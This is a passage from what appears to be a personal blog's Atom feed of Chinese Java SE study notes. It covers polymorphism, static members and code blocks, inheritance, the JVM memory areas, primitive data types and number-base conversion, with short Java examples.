class="keyword">instanceof</span>   对象变量B</span><br><span class="line"><span class="comment">//如果是相同的类返回true</span></span><br></pre></td></tr></table></figure></li></ul></blockquote><h1 id="多态中的代码分析"><a href="#多态中的代码分析" class="headerlink" title="多态中的代码分析"></a>多态中的代码分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">show2();<span class="comment">//这里调用的是子类中的show方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"我"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"爱"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>.show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">System.out.println(<span class="string">"你"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2DuoTai</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">A a = <span class="keyword">new</span> B();</span><br><span class="line">a.show();<span class="comment">//返回一个爱</span></span><br><span class="line"></span><br><span class="line">B b = <span class="keyword">new</span> C();</span><br><span class="line">b.show();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>得出结果：<blockquote><p>在多态中，父类中的方法调用另一个方法，且<code>被调用的方法</code>都存在于子类与父类中的情况下，优先调用子类的方法，也就是<code>父类方法</code>成为了一个跳板，跳转到了子类的方法中</p></blockquote></li><li>还是那句话：<blockquote><p>成员<code>方法</code>编译看左边(父类)、运行看右边(子类)</p><p>成员<code>变量</code>编译看左边(父类)、运行看左边(父类)</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;多态前提&quot;&gt;&lt;a href=&quot;#多态前提&quot; class=&quot;headerlink&quot; title=&quot;多态前提&quot;&gt;&lt;/a&gt;多态前提&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;a : 要有继承关系。&lt;/li&gt;
&lt;li&gt;b : 要有方法重写。&lt;/li&gt;
&lt;li&gt;c : 要有父类引用指向子类对象。&lt;blockquote&gt;
&lt;p&gt;例有一个父类&lt;code&gt;fu&lt;/code&gt;和一个子类&lt;code&gt;zi&lt;/code&gt;，那么父类引用子类对象为：&lt;/p&gt;
&lt;figure class=&quot;highlight ebnf&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;fu a&lt;/span&gt; = new zi();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="多态" scheme="http://liuhaoan.github.io/tags/%E5%A4%9A%E6%80%81/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_代码块与继承</title>
    <link href="http://liuhaoan.github.io/2019/04/06/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E4%BB%A3%E7%A0%81%E5%9D%97%E4%B8%8E%E7%BB%A7%E6%89%BF/"/>
    <id>http://liuhaoan.github.io/2019/04/06/javaSE复习之——面向对象-代码块与继承/</id>
    <published>2019-04-06T02:08:03.000Z</published>
    <updated>2019-04-08T11:50:22.436Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、静态方法与静态变量"><a href="#一、静态方法与静态变量" class="headerlink" title="一、静态方法与静态变量"></a>一、静态方法与静态变量</h1><h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><ul><li>如果一个类中所有方法都是static静态的，那么需要在类中声明私有构造方法，目的是不让其他类创建本类对象</li></ul><h2 id="如何防止创建本类对象？"><a href="#如何防止创建本类对象？" class="headerlink" title="如何防止创建本类对象？"></a>如何防止创建本类对象？</h2><ul><li><p>可以直接私有构造方法<br>  <code>private 类名（）{}</code></p><a id="more"></a><h2 id="如何创建一个静态方法？"><a href="#如何创建一个静态方法？" class="headerlink" title="如何创建一个静态方法？"></a>如何创建一个静态方法？</h2></li><li><p>在方法中加<code>static</code>修饰，那么这个方法是静态方法（函数）</p><blockquote><p>在载入类的时候就这个方法就已经在类的<code>静态区</code>创建，不需要创建对象即可调用</p></blockquote></li></ul><h2 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h2><ul><li>在变量前加入static那么这个变量是静态变量，与上同理，不过这个变量是共享的。<blockquote><p>比如</p><p>第一条命令给这个变量赋值“<code>张三</code>”</p><p>第二条命令又给这个变量赋值“<code>李四</code>”</p><p>那么之后调用这个变量时，这个变量返回“<code>李四</code>”</p></blockquote></li></ul><h1 id="二、构造方法-与-代码块"><a href="#二、构造方法-与-代码块" class="headerlink" title="二、构造方法 与 代码块"></a>二、构造方法 与 代码块</h1><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><ul><li><p>构造方法和类名相同，在创建这个类的对象的时候系统就会自动调用，也就是起到初始化的效果</p><blockquote><p>系统会自动创建<code>空参构造</code>，顶层的类系统自动继承object类，但是object类的构造方法没有任何输出</p></blockquote></li></ul><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><h4 id="局部代码块"><a href="#局部代码块" class="headerlink" title="局部代码块"></a>局部代码块</h4><ul><li>它在方法中出现；它可以限定变量生命周期，及早释放，提高内存利用率</li></ul><h4 id="构造代码块-初始化块"><a href="#构造代码块-初始化块" class="headerlink" title="构造代码块 (初始化块)"></a>构造代码块 (初始化块)</h4><ul><li>构造代码块可以在一个类中执行，执行完就弹栈，</li><li><p>例：</p>  <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deom</span></span>&#123;&#123;这就是构造代码块&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ps：每次创建这个类的对象构造代码块就会执行一次，并且优先执行</p></blockquote></li><li><p>构造代码块可以把一些<code>初始化的代码</code>放在其中，<code>每次调用构造都执行</code>，并且<code>在构造方法之前执行</code></p><blockquote><p>ps：实际上构造方法开发中用到的不多，但是面试可能会问</p></blockquote></li></ul><ul><li>构造代码块可以做的功能：<blockquote><p>我们可以做诸如统计创建对象的次数等功能。</p></blockquote></li></ul><h4 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h4><ul><li><p>例：</p>  <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;&#125;</span><br></pre></td></tr></table></figure></li><li><p>作用：</p><blockquote><p>用于给类进行初始化，在<code>加载的时候就执行</code>，并且<code>只执行一次</code>。</p><p>一般用于<code>加载驱动</code>，一般情况下，如果有些代码需要在项目启动的时候就执行，这时候就需要静态代码块。</p><p>比如一个项目启动需要加载的很多配置文件等资源，我们就可以都放入静态代码块中。</p></blockquote></li><li><p><code>注意事项：</code></p><blockquote><p>1、静态代码块不能访问普通变量</p><p>2、静态代码块在 <code>类</code> 中，<code>优先于主方法</code>（<code>面试题</code>）</p><p>3、静态代码块 &gt; 构造代码块 &gt; 构造函数（方法）&gt; 普通代码块</p></blockquote></li></ul><h4 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h4><blockquote><p>ps：继承与升级一般都用作系统升级</p><p><code>父类 &gt; 子类</code></p></blockquote><ul><li><p>继承的定义</p><blockquote><p><code>class 子类(当前类) extends 父类(继承的类)</code></p><p>ps：继承后调用子类等于调用父类，子类可以什么都不写，可以理解为：继承后子类相当于有了父类的方法</p></blockquote></li><li><p>继承的好处：</p><blockquote><p>1、可以提升代码的复用性，不需要打太多重复的代码</p><p>2、提升了代码的维护性，改一个代码就可以起到全局的作用，不容易出错</p><p>3、是多态的前提</p></blockquote></li><li><p>继承的弊端：</p><blockquote><p>1、耦合性非常强，父类有的一些属性可能是子类不需要的</p></blockquote></li><li><p>开发原则：</p><blockquote><p><code>高内聚、低耦合</code></p><p>耦合：类与类的关系</p><p>内聚：自己完成某件事的能力</p></blockquote></li><li><p>在java中继承的特点：</p><blockquote><p>1、Java<code>只支持单继承</code>不支持多继承（一个孩子只能有一个爹）</p><p>2、<code>可以多层继承</code>（继承体系），也就是可以继承爷爷</p><p>3、想看这个体系<code>所有功能</code>就看最底层类，也就是儿子类</p><p>4、想看这个体系<code>共性功能</code>就要看顶层类，也就是爷爷类</p></blockquote></li><li><p>注意事项</p><blockquote><p>1、子类只能继承父类所有<code>非私有</code>的成员（方法和变量）</p><p>2、<code>子类不能继承父类的构造方法</code>，因为构造方法必须和类名一样，而继承是不一样的，但可以通过<code>super</code>关键字去访问父类的构造方法</p><p>3、<code>不要为了部分功能而去继承</code>，因为<code>继承体现的是一种关系</code>，就算有相同属性也不一定继承。</p><p>比如：“猫”和“狗”的类，它们虽然都有4条腿，但是却不能继承，因为他们是同级关系，而不是父子关系，但比如有“动物”“猫”“狗”的类，那么“猫”和“狗”都可以继承“动物”的类。</p><p>4、<code>子父类如果出现相同变量那么会采取就近原则</code>，但是在真正的项目开发中不会出现这种情况，因为没有意义</p><p>5、子类<code>无论如何</code>都会访问父类中的<code>构造方法</code></p><p>6、<code>在全是静态方法的类中，构造方法必须私有化</code>，这样防止别人创建这个类的对象</p></blockquote></li></ul><h4 id="this和super"><a href="#this和super" class="headerlink" title="this和super"></a>this和super</h4><ul><li>this：<blockquote><p>代表<code>当前对象的引用</code>，如果继承了父类，那么也可以引用父类</p></blockquote></li><li>super：<blockquote><p>代表<code>对父类的引用</code></p></blockquote></li></ul><ul><li><p>一些使用实例：</p><ul><li>this.成员变量名<blockquote><p>调用本类成员变量，也可以调用父类的，但是<code>采用就近原则</code></p></blockquote></li><li><p>super.成员变量名</p><blockquote><p>调用父类的成员变量</p></blockquote><p>ps：成员变量名可以是方法名</p></li><li><p>调用父类中的构造方法:</p>  <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">super</span>(<span class="params">...</span>)</span>;</span><br></pre></td></tr></table></figure></li><li><p>调用本类中的构造方法:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">this</span>(<span class="params">...</span>)</span>;</span><br></pre></td></tr></table></figure><p>ps：一个方法里只能调用其中的一个</p></li></ul></li></ul><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li><p>类中的构造方法系统都自带<code>super()；</code>但是被隐藏了，作用是访问父类的空参构造，如果父类没用空参构造，我们需要访问父类中的有参构造，那么就可以<code>super（参数1，参数2....）；</code>也可以用this调用本类的有参构造，进而间接调用父类有参构造</p></li><li><p><code>构造方法</code>的调用都是从上到下，即<code>从父类调用到子类</code>，可以理解为一个队列</p></li><li><p>继承中的面试</p><blockquote><p>1、假设有  <code>子类方法、子类、父类</code> 且其中都有一个num的变量，那么：<code>num</code>用方法中的变量，<code>this.num</code>调用本类中的变量，<code>super.num</code>调用父类中的变量</p><p>2、在继承中不要忘记了<code>每个构造方法都会有一个super（）；访问父类</code></p><p>3、override   重写：<code>子类中</code>出现了和<code>父类中方法声明一模一样的方法</code>。与返回值类型有关,返<code>回值类型是一致的</code></p><p>4、overload  重载：<code>本类中</code>出现的<code>方法名一样</code>，<code>参数列表不同</code>的方法。<code>与返回值类型无关</code>。</p></blockquote></li><li><p>继承中的成员方法关系</p><blockquote><p>、子、父类有相同方法并且返回值类型也一样，那么会<code>调用子类的方法</code>，也叫<code>方法重写</code></p></blockquote></li></ul><ul><li>final概述<ul><li>它可以用来修饰 <code>类与变量</code> 修饰之后表示它是<code>“最终的”</code>不能被继续操作了</li></ul></li></ul><ul><li>final修饰特点<ul><li>修饰类，类不能被继承</li><li>修饰变量：<code>变量</code>就变成了<code>常量</code>，<code>只能被赋值一次</code>，通常与<code>public static</code>配套使用</li><li>修饰方法：方法<code>不能被重写</code>，表示最终方法。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、静态方法与静态变量&quot;&gt;&lt;a href=&quot;#一、静态方法与静态变量&quot; class=&quot;headerlink&quot; title=&quot;一、静态方法与静态变量&quot;&gt;&lt;/a&gt;一、静态方法与静态变量&lt;/h1&gt;&lt;h2 id=&quot;静态方法&quot;&gt;&lt;a href=&quot;#静态方法&quot; class=&quot;headerlink&quot; title=&quot;静态方法&quot;&gt;&lt;/a&gt;静态方法&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;如果一个类中所有方法都是static静态的，那么需要在类中声明私有构造方法，目的是不让其他类创建本类对象&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;如何防止创建本类对象？&quot;&gt;&lt;a href=&quot;#如何防止创建本类对象？&quot; class=&quot;headerlink&quot; title=&quot;如何防止创建本类对象？&quot;&gt;&lt;/a&gt;如何防止创建本类对象？&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;可以直接私有构造方法&lt;br&gt;  &lt;code&gt;private 类名（）{}&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="代码块" scheme="http://liuhaoan.github.io/tags/%E4%BB%A3%E7%A0%81%E5%9D%97/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——java的五大内存区域</title>
    <link href="http://liuhaoan.github.io/2019/04/05/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94java%E7%9A%84%E4%BA%94%E5%A4%A7%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F/"/>
    <id>http://liuhaoan.github.io/2019/04/05/javaSE复习之——java的五大内存区域/</id>
    <published>2019-04-05T15:40:17.000Z</published>
    <updated>2019-04-08T12:27:31.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="五大内存区域"><a href="#五大内存区域" class="headerlink" title="五大内存区域"></a>五大内存区域</h1><ul><li>堆</li><li>虚拟机栈</li><li>本地方法栈</li><li>方法区</li><li><p>寄存器区</p><blockquote><p>ps：我们主要用：虚拟机栈、方法区、堆</p></blockquote></li></ul><a id="more"></a><h1 id="Java程序运行过程"><a href="#Java程序运行过程" class="headerlink" title="Java程序运行过程"></a>Java程序运行过程</h1><ul><li>1、加载字节码文件到方法区（.class文件）</li><li>2、程序代码依次进栈（jvm执行main方法）</li></ul><h1 id="堆（heap）："><a href="#堆（heap）：" class="headerlink" title="堆（heap）："></a>堆（heap）：</h1><blockquote><p>最大的一块内存，存放对象实例的地方</p><ul><li>1、Java堆是垃圾收集器管理的主要区域，也称GC堆。</li><li>2、Java堆物理上可不连续，逻辑上连续。</li><li>3、堆中没有完成实例分配，并且对也无法在扩展时抛出 OutOfMemoryError异常</li></ul></blockquote><h1 id="虚拟机栈（stack）："><a href="#虚拟机栈（stack）：" class="headerlink" title="虚拟机栈（stack）："></a>虚拟机栈（stack）：</h1><blockquote><p>java方法执行时的内存模型</p></blockquote><ul><li>栈帧<blockquote><p>1、<code>每个方法</code>都会在虚拟机栈中创建一个对应的栈帧，用于存储<code>局部变量表</code>，<code>操作数栈</code>，<code>动态链接</code>，<code>方法出口</code>等信息。</p><p>2、一个方法的调用到结束就对应这一个栈帧从虚拟机栈<code>入栈到出栈</code>。</p></blockquote></li></ul><ul><li>局部变量表<blockquote><p>1、存放编译期可知在方法中各种<code>基本数据类型</code>和<code>对象</code>的引用，基本数据类型直接存值, 引用数据类型存地址。</p></blockquote></li></ul><p>#本地方法栈：</p><blockquote><p>本地方法栈和虚拟机栈作用相似，虚拟机栈为虚拟机执行java方法（字节码）服务，本地方法栈为jvm使用Native方法服务</p></blockquote><ul><li><p><code>本地方法</code> 关键字 <code>native</code> ，这些方法一般用来调用本地方法库中的方法这些方法，操作底层大多用C 实现。</p></li><li><p>有的虚拟机将<code>本地方法栈</code>和<code>虚拟机栈</code>合在一起，如<code>HotSpot</code>。</p></li></ul><h1 id="方法区："><a href="#方法区：" class="headerlink" title="方法区："></a>方法区：</h1><ul><li>存已经被虚拟机加载的类信息（Class对象）、<code>常量</code>、<code>静态变量</code>、即时编译器JIT编译过后的<code>代码数据</code>。</li><li><p>jdk <code>1.7</code>、1.8 对方法区做出了修改，1.8 取消了方法区。</p><blockquote><p>1、方法区被Java虚拟机规范描述为堆的一个逻辑部分，但它不是堆，有一个别名叫非堆Non-Heap</p><p>2、 jdk1.6 及之前方法区位于永久代(PermGen)，永久代和堆相互隔离。</p><p>3、方法区可以不需要连续的内存空间，也可以固定大小，也可以扩展，也可以不实现垃圾收集，如果实现则主要针对常量池的回收和类型的卸载。</p></blockquote></li><li><p>运行时常量池</p><blockquote><p>1、在方法区，用来存放编译期生成的各种符号引用和字面量</p><p>2、编译期将各种<code>符号引用</code>和<code>字面量</code>放置在class文件的常量池中，解析后在运行时常量池，字符串在方法区的字符串常量池中（1.7之前），方法运行时<code>复制</code>到局部变量表中。1.7开始字符串<code>常量池</code>被移入堆中。</p><p>符号引用： String ss = “asdsfg”  ss这个符号就是符号引用。解析阶段解析为直接引用</p><p>字面量： 值本身 如 asdfg</p><p>常量池中有各种虚拟机正常运行需要的字符串，所以有些即使不创建也还会存在于字符串常量池中如”java”。</p></blockquote></li></ul><h1 id="寄存器（程序计数器）："><a href="#寄存器（程序计数器）：" class="headerlink" title="寄存器（程序计数器）："></a>寄存器（程序计数器）：</h1><ul><li>占用较小的一块内存空间，当执行Java方法时<code>记录正在执行的虚拟机字节码指令地址</code>，如果执行Native方法则计时器值为空。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;五大内存区域&quot;&gt;&lt;a href=&quot;#五大内存区域&quot; class=&quot;headerlink&quot; title=&quot;五大内存区域&quot;&gt;&lt;/a&gt;五大内存区域&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;堆&lt;/li&gt;
&lt;li&gt;虚拟机栈&lt;/li&gt;
&lt;li&gt;本地方法栈&lt;/li&gt;
&lt;li&gt;方法区&lt;/li&gt;
&lt;li&gt;&lt;p&gt;寄存器区&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ps：我们主要用：虚拟机栈、方法区、堆&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="javaSE" scheme="http://liuhaoan.github.io/tags/javaSE/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——数据类型</title>
    <link href="http://liuhaoan.github.io/2019/04/05/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <id>http://liuhaoan.github.io/2019/04/05/javaSE复习之——数据类型/</id>
    <published>2019-04-05T12:47:43.000Z</published>
    <updated>2019-04-08T11:51:09.510Z</updated>
    
    <content type="html"><![CDATA[<h4 id="基本数据分为四大类"><a href="#基本数据分为四大类" class="headerlink" title="基本数据分为四大类"></a>基本数据分为四大类</h4><blockquote><p>重要：以后面试可能会问范围</p><p>注：通常在复制 long  float类型时都价格标识符 ，即 L 与 f 。这样不会因为数据类型而出错double类型也可以在后面加D</p></blockquote><a id="more"></a><ul><li>整数型（整数常亮默认为int类型）<ul><li><code>byte</code>：占一个字节   <code>-128</code> ~ <code>127</code></li><li><code>short</code>：占两个字节   <code>-2^15</code> ~ <code>2^15-1</code></li><li><code>int</code>：占四个字节   <code>-2^31</code> ~ <code>2^31-1</code></li><li><code>long</code>：占八个字节   <code>-2^63</code> ~ <code>2^63-1</code></li></ul></li></ul><ul><li>浮点型（小数型，默认小数是double类型）<ul><li><code>float</code>：占<code>四个字节</code><blockquote><p>-2^128 ~ 2^128        绝对保证精度6位，但有7位有效数字</p></blockquote></li><li><code>double</code>：占<code>八个字节</code><blockquote><p>-2^1024 ~ 2^1024        绝对保证精度15位，但有16位有效数字</p></blockquote></li></ul></li></ul><ul><li>字符型<ul><li><code>char</code>：占两个字节   0 ~ 65535</li></ul></li></ul><ul><li>布尔型（判断）<ul><li><code>boolean</code>：理论<code>八分之一字节</code>，因为只要0和1就能分别决定false和true了，但是boolean并没有明确指定大小</li></ul></li></ul><blockquote><p>ps：<code>float</code>由32个二进制位组成，1位代表符号、8位代表指数位 00000000-11111111 同等与 0 - 255 其中 255代表无穷大，指数范围就是-126 ~ 127这比long的63大，所以float虽然才四个字节但是比long范围大</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;基本数据分为四大类&quot;&gt;&lt;a href=&quot;#基本数据分为四大类&quot; class=&quot;headerlink&quot; title=&quot;基本数据分为四大类&quot;&gt;&lt;/a&gt;基本数据分为四大类&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;重要：以后面试可能会问范围&lt;/p&gt;
&lt;p&gt;注：通常在复制 long  float类型时都价格标识符 ，即 L 与 f 。这样不会因为数据类型而出错double类型也可以在后面加D&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="数据类型" scheme="http://liuhaoan.github.io/tags/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——进制编码</title>
    <link href="http://liuhaoan.github.io/2019/04/05/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81/"/>
    <id>http://liuhaoan.github.io/2019/04/05/javaSE复习之——进制编码/</id>
    <published>2019-04-05T12:27:44.000Z</published>
    <updated>2019-04-08T11:49:23.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="进制的运算"><a href="#进制的运算" class="headerlink" title="进制的运算"></a>进制的运算</h2><ul><li><p>二进制向右移动两位 ：15 &gt;&gt; 2 = 3</p><ul><li>ps：1111 向右移动两位 等于 0011 = 3</li></ul></li><li><p>二进制向左移动两位 ：15 &lt;&lt; 2 = 60</p><ul><li>ps：1111 向左移动两位 等于 111100 = 60</li></ul></li><li><p>异或运算 ：2 ^ 3 = 1</p><ul><li>例子：0010 ^ 0011 = 0001<blockquote><p>ps：也就是相同为0不同为1，当0001^0011或者0001^0010时都能得出另一个数，和乘法除法运算一样</p></blockquote></li></ul></li><li><p>与运算 ：2 &amp; 3 = 2</p><ul><li>例子：0010 &amp; 0011=0010<blockquote><p>“与”运算中也是二进制位的运算，只要有一个是0那么结果就是0</p><a id="more"></a></blockquote><h2 id="java中的数据表示法"><a href="#java中的数据表示法" class="headerlink" title="java中的数据表示法"></a>java中的数据表示法</h2></li></ul></li><li>在java中数据前面加  0x表示16进制   0b表示二进制   0表示8进制</li></ul><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h2><blockquote><p>任何进制转10进制都是    每一位  第某位的数据 乘 被转换的进制数 的 第某位索引次幂  相加</p></blockquote><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="八转10："><a href="#八转10：" class="headerlink" title="八转10："></a>八转10：</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0120</span>=<span class="number">1</span> * <span class="number">8</span> ^ <span class="number">2</span> + <span class="number">2</span> * <span class="number">8</span> ^ <span class="number">1</span> + <span class="number">0</span> * <span class="number">8</span> ^ <span class="number">0</span> = <span class="number">80</span></span><br></pre></td></tr></table></figure><blockquote><p>10进制转任何进制都是    除 要转换的进制数 然后取余数，以此类推，最后得出的数据为：进制数从左到右 = 余数列表的从下到上</p></blockquote><h4 id="2、8互转与2、16互转方法："><a href="#2、8互转与2、16互转方法：" class="headerlink" title="2、8互转与2、16互转方法："></a>2、8互转与2、16互转方法：</h4><blockquote><ul><li>2转8 = 3位一组转8<ul><li>8转2 = 每一位转2</li></ul></li><li>2转16 = 4位一组转16    <ul><li>16转2 = 每一位转2</li></ul></li></ul></blockquote><h4 id="二进制快速转换10进制方法："><a href="#二进制快速转换10进制方法：" class="headerlink" title="二进制快速转换10进制方法："></a>二进制快速转换10进制方法：</h4><blockquote><ul><li>二进制：<code>1    1    1    1    1    1    1    1</code></li><li>十进制：<code>128    64    32    16    8    4    2    1</code></li></ul></blockquote><h4 id="二进制表示法"><a href="#二进制表示法" class="headerlink" title="二进制表示法:"></a>二进制表示法:</h4><blockquote><p>符号位0为正，1为负</p></blockquote><h4 id="计算机二进制运算原理"><a href="#计算机二进制运算原理" class="headerlink" title="计算机二进制运算原理"></a>计算机二进制运算原理</h4><blockquote><p>计算机二进制运算都是用补码</p></blockquote><ul><li><p>例子：</p><blockquote><p>+7 的原码是 0 0000111</p></blockquote></li><li><p>ps：正数的、原码、反码、补码都一样</p></li></ul><blockquote><p>-7 的原码为 1 0000111</p><p>反码为 1 1111000 （符号位不变）</p><p>补码为 1 1111001（在反码的基础上加1）</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;进制的运算&quot;&gt;&lt;a href=&quot;#进制的运算&quot; class=&quot;headerlink&quot; title=&quot;进制的运算&quot;&gt;&lt;/a&gt;进制的运算&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;二进制向右移动两位 ：15 &amp;gt;&amp;gt; 2 = 3&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ps：1111 向右移动两位 等于 0011 = 3&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;二进制向左移动两位 ：15 &amp;lt;&amp;lt; 2 = 60&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ps：1111 向左移动两位 等于 111100 = 60&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;异或运算 ：2 ^ 3 = 1&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;例子：0010 ^ 0011 = 0001&lt;blockquote&gt;
&lt;p&gt;ps：也就是相同为0不同为1，当0001^0011或者0001^0010时都能得出另一个数，和乘法除法运算一样&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;与运算 ：2 &amp;amp; 3 = 2&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;例子：0010 &amp;amp; 0011=0010&lt;blockquote&gt;
&lt;p&gt;“与”运算中也是二进制位的运算，只要有一个是0那么结果就是0&lt;/p&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
